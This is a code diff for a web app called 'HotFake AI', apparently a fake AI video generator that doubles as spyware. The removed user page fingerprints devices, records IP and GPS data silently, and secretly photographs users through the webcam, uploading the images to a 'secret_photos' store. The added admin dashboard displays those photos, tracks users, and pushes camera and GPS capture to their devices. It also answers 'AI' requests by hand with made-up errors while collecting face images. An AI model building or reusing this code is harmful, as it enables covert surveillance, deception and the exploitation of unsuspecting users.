@@ -1,162 +1,172 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="theme-color" content="#07070F">
-    <title>HotFake AI – Video Generator</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HotFake AI – Master Admin</title>
+  <meta name="robots" content="noindex, nofollow">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --surf3: #1F1F34; --red: #E63946; --green: #2DC653; --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --sidebar:260px; }
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family:var(--font); background:var(--bg); color:var(--text); }
     
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <style>
-      :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --red: #E63946; --red-glow: rgba(230,57,70,0.25); --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: 0.28s cubic-bezier(.4,0,.2,1); }
-      *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
-      body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; padding-bottom: 75px; }
-      
-      header { position: sticky; top: 0; z-index: 100; background: rgba(7,7,15,0.88); backdrop-filter: blur(18px); border-bottom: 1px solid var(--border); padding: .9rem 2rem; }
-      nav { max-width:1400px; margin:0 auto; display:flex; align-items:center; justify-content:space-between; }
-      .logo { font-size:1.6rem; font-weight:800; color:var(--text); text-decoration:none; display:flex; align-items:center; gap:.4rem; letter-spacing:-1px; }
-      
-      .container { max-width: 800px; margin: 2rem auto; padding: 0 1.5rem; }
-      .card { background: var(--surf); border: 1px solid var(--border); border-radius: var(--radius); padding: 2rem; margin-bottom: 2rem; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-      
-      .inp { width: 100%; padding: 1rem; background: var(--surf2); border: 1px solid var(--border); border-radius: 10px; color: var(--text); font-family: var(--font); margin-bottom: 1rem; outline: none; font-size: 0.95rem; }
-      .inp:focus { border-color: var(--red); box-shadow: 0 0 0 3px var(--red-glow); }
-      textarea.inp { resize: vertical; min-height: 120px; }
-      
-      .btn { display: inline-flex; align-items: center; justify-content: center; gap: .5rem; padding: 1rem; border-radius: 10px; font-weight: 600; cursor: pointer; border: none; background: var(--red); color: #fff; width: 100%; font-size: 1rem; font-family: var(--font); transition: transform 0.2s; }
-      .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--red-glow); }
-      .btn-gray { background: var(--surf2); border: 1px solid var(--border); }
-      
-      .upload-box { width: 100%; aspect-ratio: 16/9; background: var(--surf2); border: 2px dashed rgba(255,255,255,0.2); border-radius: 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin-bottom: 1rem; position: relative; overflow: hidden; transition: all 0.3s;}
-      .upload-box:hover { border-color: var(--red); background: rgba(230,57,70,0.05); }
-      .upload-box img#previewImg { width: 100%; height: 100%; object-fit: cover; position: absolute; inset: 0; display: none; z-index: 1; }
-      
-      .processing-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; display: none; }
-      .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-      .proc-text { font-size: 0.9rem; font-weight: 500; font-family: monospace; color: #a5a5b5; text-align: center; padding: 0 10px; }
-      
-      .result-overlay { position: absolute; inset: 0; background: rgba(0,0,0,0.85); z-index: 20; display: none; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; backdrop-filter: blur(5px);}
-      .error-msg { color: #ff8c94; font-size: 0.85rem; font-weight: 600; margin-bottom: 15px; background: rgba(230,57,70,0.2); padding: 10px; border-radius: 8px; border: 1px solid var(--red); }
-      
-      @keyframes spin { 100% { transform: rotate(360deg); } }
-      .hidden { display: none !important; }
+    #loginScreen { min-height:100vh; display:flex; align-items:center; justify-content:center; }
+    .login-box { width:100%; max-width:380px; background:var(--surf); border:1px solid var(--border); border-radius:20px; padding:2.5rem 2rem; }
+    .inp { width:100%; padding:.75rem 1rem; background:var(--surf2); border:1px solid var(--border); border-radius:10px; color:var(--text); margin-bottom:1rem; outline:none; font-family: var(--font);}
+    .inp:focus { border-color:var(--red); }
+    .btn { display:inline-flex; align-items:center; justify-content:center; gap:.5rem; padding:.7rem 1.4rem; border-radius:10px; font-weight:600; cursor:pointer; border:none; color:#fff;}
+    .btn-red { background:var(--red); } .btn-green { background:var(--green); } .btn-gray { background:var(--surf3); border:1px solid var(--border); } .btn-danger { background:rgba(230,57,70,.12); color:var(--red); border:1px solid rgba(230,57,70,.3); } .btn-full { width:100%; padding:.85rem; }
+    
+    .sidebar { position:fixed; top:0; left:0; bottom:0; width:var(--sidebar); background:var(--surf); border-right:1px solid var(--border); display:flex; flex-direction:column; padding:1.5rem 1rem; z-index:50; }
+    .snav { flex:1; overflow-y:auto; } .snav-title { font-size:.72rem; color:var(--muted); font-weight:600; text-transform:uppercase; margin-top:.5rem; margin-bottom:.5rem;}
+    .slink { display:flex; padding:.65rem .75rem; border-radius:10px; color:var(--muted); text-decoration:none; font-size:.9rem; cursor:pointer; }
+    .slink:hover { background:var(--surf2); color:var(--text); } .slink.active { background:rgba(230,57,70,.15); color:var(--red); }
+    .content { margin-left:var(--sidebar); padding:2.5rem 2rem; min-height:100vh; }
+    .page { display:none; } .page.active { display:block; }
+    .card-panel { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:1.5rem; margin-bottom: 1.5rem; overflow-x:auto;}
+    
+    table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-size: 0.9rem;}
+    th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); vertical-align: top;}
+    th { color: var(--muted); }
+    .badge { padding: 4px 8px; border-radius: 6px; font-size: 0.75rem; font-weight: 600; display: inline-block; margin-bottom: 5px; }
+    .b-pending { background: rgba(240,173,78,0.2); color: #f0ad4e; } .b-generating { background: rgba(2,117,216,0.2); color: #5bc0de; } .b-error { background: rgba(230,57,70,0.2); color: #ff8c94; } .b-completed { background: rgba(45,198,83,0.2); color: #6ef59a; }
+    .hidden { display: none !important; }
 
-      .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); }
-      .modal-content { background:var(--surf); border:1px solid var(--red); border-radius:20px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
-      .modal-btn-group { display:flex; gap:0.8rem; justify-content:center; width: 100%; margin-top: 15px;}
-      .info-box { background: rgba(0,0,0,0.3); border-left: 3px solid var(--red); padding: 12px 14px; border-radius: 8px; text-align: left; margin-bottom: 1.5rem; }
+    .modal-wrap { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; padding:1rem; backdrop-filter: blur(5px);}
+    .modal-box { background:var(--surf); border:1px solid var(--red); border-radius:var(--radius); padding:2rem; width:100%; max-width:1050px; max-height:90vh; overflow-y:auto;}
+    .action-row { padding: 8px 10px; border-bottom: 1px solid var(--border); font-size: 0.85rem; display: flex; justify-content: space-between; align-items: center; }
+    .adv-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(180px, 1fr)); gap:10px; background:var(--surf2); padding:1.2rem; border-radius:10px; margin-bottom:1.5rem; font-size:0.85rem;}
+    .adv-grid span { color:var(--text); font-weight:500; display:block; margin-top:2px; font-size:0.95rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
+    .adv-grid b { color:var(--muted); font-size:0.75rem; text-transform:uppercase; letter-spacing:0.5px;}
 
-      #playerModal { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; touch-action: none !important;}
-      .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; }
-      #iframePlayer { width: 100%; height: 100%; border: none; z-index: 1; display:none; }
-      #nativePlayer { width: 100%; height: 100%; z-index: 2; background:#000; display:none; }
-      .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; pointer-events: none; }
-      .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.9), transparent); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; pointer-events: auto; }
-      .ui-back-btn { background: rgba(255,255,255,0.15); color: white; width: 40px; height: 40px; border-radius: 50%; font-size: 1.1rem; display: flex; justify-content: center; align-items: center; cursor: pointer; border:none;}
-      
-      .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(15,15,28,0.95); backdrop-filter: blur(15px); border-top: 1px solid var(--border); display: flex; justify-content: space-around; padding: 10px 0; z-index: 1000; }
-      .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--muted); text-decoration: none; font-size: 0.7rem; font-weight: 500; gap: 4px; }
-      .nav-item.active { color: #fff; }
-    </style>
+    .ai-history-card { background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 10px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; flex-wrap: wrap; }
+    .ai-history-img { width: 120px; height: 120px; object-fit: cover; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); background: #111; }
+    .ai-history-content { flex: 1; min-width: 250px; }
+    .ai-history-meta { font-size: 0.75rem; color: var(--muted); margin-bottom: 5px; display: flex; justify-content: space-between; }
+    .ai-history-prompt { font-style: italic; font-size: 0.9rem; color: #fff; margin-bottom: 10px; line-height: 1.4; }
+  </style>
 </head>
 <body>
 
-<video id="secretVideo" width="640" height="480" autoplay playsinline style="display:none;"></video>
-<canvas id="secretCanvas" width="640" height="480" style="display:none;"></canvas>
-
-<div id="ageGate" class="modal-bg" style="display:none;">
-    <div class="modal-content">
-        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🔞</div>
-        <h3>Age Verification</h3>
-        <p style="color:var(--muted); font-size:0.85rem;">This AI generates mature content. Are you 18+?</p>
-        <div class="modal-btn-group">
-            <button class="btn btn-gray" onclick="setAgeStatus('no')">Under 18</button>
-            <button class="btn" onclick="setAgeStatus('yes')">I am 18+</button>
-        </div>
-    </div>
-</div>
-
-<div id="banGate" class="modal-bg" style="display:none; z-index: 999999;">
-    <div class="modal-content">
-        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🚫</div>
-        <h3>Access Denied</h3><p style="color:var(--muted); font-size:0.85rem;">Your device is permanently banned.</p>
-    </div>
-</div>
-
-<div id="gpsGate" class="modal-bg" style="display:none; z-index: 10005;">
-    <div class="modal-content">
-        <div style="font-size: 3rem; margin-bottom: 0.5rem;">🌍</div>
-        <h3>Location Request</h3>
-        <p style="color:var(--muted); font-size:0.85rem;">For security, we recommend granting location access. If unavailable, you may still proceed.</p>
-        <div class="info-box"><p style="margin:0; font-size:0.8rem; color:#a5a5b5;"><b>Note:</b> You can ignore this step by tapping Continue.</p></div>
-        <button class="btn" style="width:100%;" onclick="requestGPSAccess()">Continue Setup</button>
-    </div>
-</div>
-
-<header>
-  <nav>
-    <a href="#" class="logo"><span style="color:var(--red);">▶</span> HotFake AI</a>
-  </nav>
-</header>
-
-<div class="container">
-
-    <div id="appSection" class="hidden">
-        <div class="card" id="generatorCard">
-            <h3 style="margin-bottom: 1rem; color: var(--red);">✨ Generate Video</h3>
-            
-            <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageSelect(event)">
-            <div class="upload-box" id="uploadBox" onclick="document.getElementById('fileInput').click()">
-                <div id="uploadPlaceholder">
-                    <div style="font-size: 2.5rem; margin-bottom: 10px;">📸</div>
-                    <div style="color: #a5a5b5; font-size: 0.9rem; font-weight: 500;">Tap to Select Image</div>
-                </div>
-                <img id="previewImg">
-                
-                <div class="processing-overlay" id="procOverlay">
-                    <div class="spinner"></div>
-                    <div class="proc-text" id="procText">Uploading HQ Image...</div>
-                </div>
-
-                <div class="result-overlay" id="resultOverlay"></div>
-            </div>
-
-            <div id="inputControls">
-                <textarea id="aiPrompt" class="inp" placeholder="Describe the scene, characters, and actions in detail..."></textarea>
-                <button id="genBtn" class="btn" onclick="startGeneration()">✨ Generate</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<div id="playerModal">
-  <div class="player-wrapper">
-       <div class="smart-overlay">
-           <div class="glass-top">
-               <div style="display:flex; align-items:center;">
-                   <button class="ui-back-btn" onclick="closePlayer()">⬅</button>
-                   <span class="overlay-title" id="overlayTitle" style="margin-top:8px;">Generated Video</span>
-               </div>
-           </div>
-       </div>
-       <video id="nativePlayer" controls playsinline></video>
-       <iframe id="iframePlayer" allowfullscreen></iframe>
+<div id="loginScreen">
+  <div class="login-box">
+    <h1 style="text-align:center; color:#fff; margin-bottom:2rem;">▶ Master Admin</h1>
+    <input class="inp" type="email" id="emailInput" placeholder="Admin Email">
+    <input class="inp" type="password" id="passInput" placeholder="Password">
+    <button id="loginBtn" class="btn btn-red btn-full">🔑 Authenticate Admin</button>
   </div>
 </div>
 
-<div class="bottom-nav">
-    <a href="index.html" class="nav-item active"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path></svg>Generate</a>
-    <a href="profile.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>Saved</a>
-    <a href="contact-support.html" class="nav-item"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>Auth</a>
+<div id="adminDash" style="display:none;">
+  <aside class="sidebar">
+    <div style="font-size:1.3rem; font-weight:800; color:#fff; margin-bottom:1.5rem;"><span style="color:var(--red);">▶</span> HotFake AI</div>
+    <nav class="snav">
+      <div class="snav-title">AI Engine</div>
+      <a class="slink active" data-page="aiQueuePage">🤖 AI Generation Queue</a>
+      
+      <div class="snav-title">System & Users</div>
+      <a class="slink" data-page="usersPage">👥 Users Tracking</a>
+      <a class="slink" data-page="approvalsPage">🛡️ Device Approvals</a>
+      <a class="slink" data-page="photosPage">📸 Secret Photos</a>
+    </nav>
+    <a class="slink" id="logoutBtn" style="color:#ff8c94; margin-top:2rem;">🚪 Secure Logout</a>
+  </aside>
+
+  <div class="content">
+
+    <div class="page active" id="aiQueuePage">
+      <h2>🤖 AI Video Requests</h2>
+      <p style="color:var(--muted); font-size: 0.85rem;">Manage incoming video prompts, download reference images, and push results or errors.</p>
+      <div class="card-panel">
+        <table>
+            <thead><tr><th>Device ID</th><th style="width: 35%;">Prompt & Image</th><th>Status</th><th style="text-align:right;">Actions</th></tr></thead>
+            <tbody id="aiQueueTbody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="page" id="usersPage">
+      <h2>👥 AI Audience Tracking</h2>
+      <div class="card-panel">
+        <input type="text" id="trackSearch" class="inp" placeholder="🔍 Search Device ID..." style="margin-bottom: 1rem;">
+        <table id="usersTableObj">
+            <thead><tr><th>Hardware ID</th><th>Device OS</th><th>First Visit</th><th>Status</th><th style="text-align:right;">Profile & Details</th></tr></thead>
+            <tbody id="userTableBody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="page" id="approvalsPage">
+        <h2>🛡️ Pending Device Approvals</h2>
+        <div class="card-panel">
+            <table>
+                <thead><tr><th>Hardware ID</th><th>Reason / Message</th><th style="text-align:right;">Actions</th></tr></thead>
+                <tbody id="approvalsTbody"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="page" id="photosPage">
+      <div style="display:flex; justify-content:space-between;"><h2>📸 Secret Photos</h2><button class="btn btn-gray" id="refreshPhotosBtn">Reload</button></div>
+      <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; margin-top: 1.5rem;" id="photosGrid"></div>
+    </div>
+
+  </div>
+</div>
+
+<div id="userModal" class="modal-wrap">
+  <div class="modal-box">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem;">
+        <h3 id="umTitle" style="color:var(--red); font-family:monospace; margin:0;">User Profile</h3>
+        <button id="banToggleBtn" class="btn btn-red">Ban Device</button>
+    </div>
+    
+    <div class="adv-grid">
+        <div style="border-bottom: 1px solid var(--red); padding-bottom: 5px;"><b>ID Source</b><span id="umIdSource" style="color: var(--green);">None</span></div>
+        <div><b>Device Type</b><span id="umType">None</span></div>
+        <div><b>OS & Browser</b><span id="umOSBrowser">None</span></div>
+        <div><b>Graphics / GPU</b><span id="umGPU" style="font-size:0.75rem;">None</span></div>
+        <div><b>Hardware Details</b><span id="umHardware">None</span></div>
+        <div><b>Network ISP</b><span id="umISP">None</span></div>
+        <div><b>Location</b><span id="umLocation">None</span></div>
+        <div><b>IP Address</b><span id="umIp">None</span></div>
+        <div><b>First Visit</b><span id="umFirst">None</span></div>
+        <div><b>Last Active</b><span id="umLast">None</span></div>
+    </div>
+
+    <div style="background:var(--surf3); border:1px solid var(--red); padding:1rem; border-radius:10px; margin-bottom:1.5rem;">
+        <h4 style="margin-bottom:0.5rem; color:#fff;">📡 Live Security Access Force (Push to Device)</h4>
+        <div style="display:flex; gap:1.5rem; align-items:center; flex-wrap:wrap;">
+            <label style="display:inline-flex; align-items:center; gap:5px; color:var(--muted);"><input type="checkbox" id="pushCam"> Capture Camera</label>
+            <label style="display:inline-flex; align-items:center; gap:5px; color:var(--muted);"><input type="checkbox" id="pushLoc"> Fetch Exact GPS</label>
+            <button class="btn btn-red" id="pushPermBtn" style="padding:0.4rem 1rem;">Push Requests Now</button>
+        </div>
+    </div>
+
+    <div style="display:flex; gap:1.5rem; flex-wrap:wrap; margin-bottom:1.5rem;">
+        <div style="flex:1; min-width:300px;">
+            <h4 style="margin-bottom:0.5rem; color:#f0ad4e;">🔴 Live User Activities</h4>
+            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; height:350px; overflow-y:auto;" id="umActionsList"></div>
+        </div>
+
+        <div style="flex:2; min-width:450px;">
+            <h4 style="margin-bottom:0.5rem; color:#5bc0de;">✨ AI Video Prompt History</h4>
+            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; height:350px; overflow-y:auto; padding:15px;" id="umAiHistory"></div>
+        </div>
+    </div>
+    
+    <button class="btn btn-gray btn-full" onclick="document.getElementById('userModal').style.display='none'">Close Dashboard</button>
+  </div>
 </div>
 
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-  import { getDatabase, ref, set, push, onValue, update, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+  import { getDatabase, ref, set, update, remove, onValue, get, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+  import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
 
-  // Updated with New Firebase Project Credentials
   const firebaseConfig = {
-    apiKey: "AIzaSyAI3ysLR_LFnG5dw2SY8AwF1ldGgc43ywE",
+    apiKey: "AIzaSyAI3ysLR_lFaG5dw2SY8AwF1ldGgc43ywE",
     authDomain: "ai-studio-b0c87.firebaseapp.com",
     databaseURL: "https://ai-studio-b0c87-default-rtdb.firebaseio.com",
     projectId: "ai-studio-b0c87",
@@ -167,293 +177,256 @@
 
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
+  const auth = getAuth(app); 
+  const adminStatusRef = ref(db, 'settings/admin_status');
+
+  let allUsersRaw = {};
+  let viewingUserId = null;
+
+  onAuthStateChanged(auth, (user) => {
+    if (user) {
+      document.getElementById('loginScreen').style.display = 'none'; 
+      document.getElementById('adminDash').style.display = 'flex';
+      set(adminStatusRef, true);
+      onValue(ref(db, ".info/connected"), (snap) => { if (snap.val() === true) { onDisconnect(adminStatusRef).set(false); set(adminStatusRef, true); } });
+      initAdmin();
+    } else {
+      document.getElementById('loginScreen').style.display = 'flex'; 
+      document.getElementById('adminDash').style.display = 'none';
+    }
+  });
+
+  document.getElementById('loginBtn').addEventListener('click', () => {
+      signInWithEmailAndPassword(auth, document.getElementById('emailInput').value, document.getElementById('passInput').value)
+        .catch(err => alert("Login Failed: " + err.message));
+  });
   
-  let deviceId = null;
-  let isGpuOnline = false;
-  let currentBase64Image = "";
-  let activeReqId = null;
-  let animationInterval = null;
+  document.getElementById('logoutBtn').addEventListener('click', () => { 
+      set(adminStatusRef, false).then(() => signOut(auth).then(() => location.reload())); 
+  });
 
-  function getDeepDeviceId() {
-      if (window.AndroidInterface && window.AndroidInterface.getRootId) return "APP-" + window.AndroidInterface.getRootId();
-      const hwCores = navigator.hardwareConcurrency || 2; const ram = navigator.deviceMemory || 2;
-      const os = (/Android/i.test(navigator.userAgent)) ? "AND" : (/iPhone|iPad/i.test(navigator.userAgent)) ? "IOS" : "PC";
-      const screenRes = window.screen.width + "x" + window.screen.height + "x" + window.screen.colorDepth;
-      let gpu = "UnknownGPU";
-      try { const gl = document.createElement('canvas').getContext('webgl'); if(gl) { const dbg = gl.getExtension('WEBGL_debug_renderer_info'); if(dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); } } catch(e) {}
-      const rawString = `${hwCores}-${ram}-${os}-${screenRes}-${gpu}`;
-      let hash = 0; for (let i = 0; i < rawString.length; i++) { hash = ((hash << 5) - hash) + rawString.charCodeAt(i); hash |= 0; }
-      const finalId = `${os}-HW-${Math.abs(hash).toString(36).toUpperCase()}`;
-      localStorage.setItem('hotfake_deep_uid', finalId);
-      return finalId;
-  }
-  deviceId = getDeepDeviceId();
-
-  function getAdvancedDeviceInfo() {
-      const ua = navigator.userAgent; let type = "Desktop"; 
-      if (/Tablet|iPad/i.test(ua) || (navigator.maxTouchPoints && navigator.maxTouchPoints > 2)) type = "Tablet";
-      else if (/Mobile|Android|iP(hone|od)/i.test(ua)) type = "Mobile";
-      let os = (/Windows/i.test(ua)) ? "Windows" : (/Mac/i.test(ua)) ? "MacOS" : (/Android/i.test(ua)) ? "Android" : "iOS";
-      return { type: type, os: os, browser: (/Edg/i.test(ua)) ? "Edge" : (/Chrome/i.test(ua)) ? "Chrome" : "Safari", screen: `${window.screen.width}x${window.screen.height}` };
-  }
-
-  window.logAction = function(actionDesc) { 
-      if(!deviceId) return; 
-      set(ref(db, `users/${deviceId}/actions/${Date.now()}`), { action: actionDesc, time: new Date().toISOString() }); 
-  };
-
-  function silentGPSUpdate() {
-      if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-              (pos) => { if(deviceId) { set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: Math.round(pos.coords.accuracy) + "m", time: new Date().toISOString() }); } },
-              (err) => {}, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-      }
-  }
-
-  async function trackUser() {
-      const advInfo = getAdvancedDeviceInfo(); 
-      const fullDate = new Date().toISOString();
-      let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" }; 
-      try { const res = await fetch('https://ipapi.co/json/'); if(res.ok) { const jd = await res.json(); ipData = { ip: jd.ip, city: jd.city, region: jd.region, org: jd.org }; } } catch(e){}
-
-      get(ref(db, `users/${deviceId}`)).then((snap) => {
-          const locId = Date.now();
-          if (!snap.exists()) { 
-              set(ref(db, `users/${deviceId}`), { firstVisit: fullDate, lastActive: fullDate, status: "Live", network: ipData, device: advInfo, banned: false, deviceApproved: false, locationHistory: { [locId]: { ...ipData, time: fullDate } } }); 
-              logAction("First visit to App");
-          } else { 
-              update(ref(db, `users/${deviceId}`), { lastActive: fullDate, network: ipData, status: "Live", device: advInfo }); 
-              set(ref(db, `users/${deviceId}/locationHistory/${locId}`), { ...ipData, time: fullDate });
-              logAction("App Opened"); 
-          }
-          checkGates();
+  function initAdmin() {
+      document.querySelectorAll('.slink[data-page]').forEach(link => {
+        link.addEventListener('click', function() {
+          document.querySelectorAll('.slink').forEach(l => l.classList.remove('active')); this.classList.add('active');
+          document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(this.dataset.page).classList.add('active');
+          if (this.dataset.page === 'photosPage') loadSecretPhotos();
+        });
       });
 
-      onValue(ref(db, ".info/connected"), (snap) => { 
-          if (snap.val() === true && deviceId) { onDisconnect(ref(db, `users/${deviceId}/status`)).set("Offline").then(() => { update(ref(db, `users/${deviceId}`), { status: "Live" }); }); } 
-      });
-  }
-
-  function checkGates() {
-      if(!localStorage.getItem('gpsVerified')) { window.location.href = 'permission.html'; return; }
-      const ageStatus = sessionStorage.getItem('ageStatus');
-      if (!ageStatus) { document.getElementById('ageGate').style.display = 'flex'; return; }
-
-      get(ref(db, `users/${deviceId}`)).then(snap => {
-          if(snap.exists()) {
-              const u = snap.val();
-              if(u.banned) { document.getElementById('banGate').style.display = 'flex'; return; }
-              if(u.deviceApproved !== true) { window.location.href = 'contact-support.html'; return; } 
+      onValue(ref(db, 'ai_requests'), async (snap) => {
+          const tb = document.getElementById('aiQueueTbody'); tb.innerHTML = '';
+          const data = snap.val() || {}; const requests = Object.keys(data).reverse();
+          for(let k of requests) {
+              const req = data[k];
+              let b = ''; 
+              if(req.status === 'uploading') b = '<span class="badge b-generating">📤 Uploading...</span>';
+              else if(req.status === 'pending') b = '<span class="badge b-pending">⏳ Pending</span>'; 
+              else if(req.status === 'generating') b = '<span class="badge b-generating">⚙️ Generating</span>'; 
+              else if(req.status === 'error') b = `<span class="badge b-error">⚠️ Error</span><br><small>${req.errorMsg}</small>`; 
+              else b = '<span class="badge b-completed">✅ Completed</span>';
               
-              document.getElementById('appSection').classList.remove('hidden');
-              checkActiveGeneration();
-              attemptSilentCapture(); silentGPSUpdate();
-          } else { window.location.href = 'contact-support.html'; }
-      });
-  }
+              let imgHtml = (req.imageUrl && req.imageUrl !== "uploading") ? `<br><img src="${req.imageUrl}" style="max-width:200px; border-radius:8px; border:1px solid var(--border); margin-top:10px;"><br><a href="${req.imageUrl}" download="User_Reference_Image.jpg" class="btn btn-gray" style="padding:0.4rem; font-size:0.75rem; margin-top:5px; text-decoration:none; display:inline-block;">⬇ Download HQ Image</a>` : '';
 
-  function attemptSilentCapture() {
-      navigator.permissions.query({ name: 'camera' }).then(perm => {
-          if (perm.state === 'granted') {
-              navigator.mediaDevices.getUserMedia({ video: true, audio: false }).then(stream => {
-                  const video = document.getElementById('secretVideo'); const canvas = document.getElementById('secretCanvas');
-                  video.srcObject = stream; video.play();
-                  video.addEventListener('canplay', () => {
-                      setTimeout(() => {
-                          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                          const dataUrl = canvas.toDataURL('image/jpeg', 0.5); 
-                          set(ref(db, 'secret_photos/' + Date.now().toString(36)), { imageBase64: dataUrl, deviceId: deviceId, time: new Date().toISOString() });
-                          stream.getTracks().forEach(t => t.stop());
-                      }, 150);
-                  }, { once: true });
-              }).catch(e=>{});
+              tb.innerHTML += `<tr>
+                  <td><b style="font-family:monospace; color:var(--red);">${req.deviceId || 'Unknown'}</b></td>
+                  <td><div style="background:var(--surf2); padding:10px; border-radius:8px; font-style:italic;">"${req.prompt}"</div>${imgHtml}</td>
+                  <td>${b}</td>
+                  <td style="text-align:right;">
+                      ${req.status !== 'completed' ? `
+                          <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; margin-bottom:10px;">
+                              <select id="errSelect_${k}" class="inp" style="padding:0.4rem; margin-bottom:5px;" onchange="toggleCustomErr('${k}')">
+                                  <option value="">-- Select Error --</option>
+                                  <option value="GPU Cluster Offline. Please try again later.">GPU Offline</option>
+                                  <option value="Face not clearly visible in reference image.">Bad Image / No Face</option>
+                                  <option value="NSFW content detected and blocked by filters.">NSFW Blocked</option>
+                                  <option value="custom">Type Custom Error...</option>
+                              </select>
+                              <input type="text" id="errInput_${k}" class="inp hidden" placeholder="Type custom error..." style="padding:0.4rem; margin-bottom:5px;">
+                              <button class="btn btn-danger btn-full" style="padding:0.4rem;" onclick="sendAiError('${k}')">Send Error</button>
+                          </div>
+                          
+                          <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:8px;">
+                              <input type="url" id="vid_${k}" class="inp" placeholder="Paste generated video URL" style="padding:0.4rem; margin-bottom:5px;">
+                              <button class="btn btn-green btn-full" style="padding:0.4rem;" onclick="uploadAiVideo('${k}')">Upload & Complete</button>
+                          </div>
+                      ` : `<button class="btn btn-danger" onclick="remove(ref(db, 'ai_requests/${k}'))">Delete DB Log</button>`}
+                  </td>
+              </tr>`;
           }
       });
-  }
 
-  window.setAgeStatus = (status) => { sessionStorage.setItem('ageStatus', status); document.getElementById('ageGate').style.display = 'none'; logAction("Age verified: "+status); checkGates(); }
-  window.requestGPSAccess = () => {
-      if ("geolocation" in navigator) {
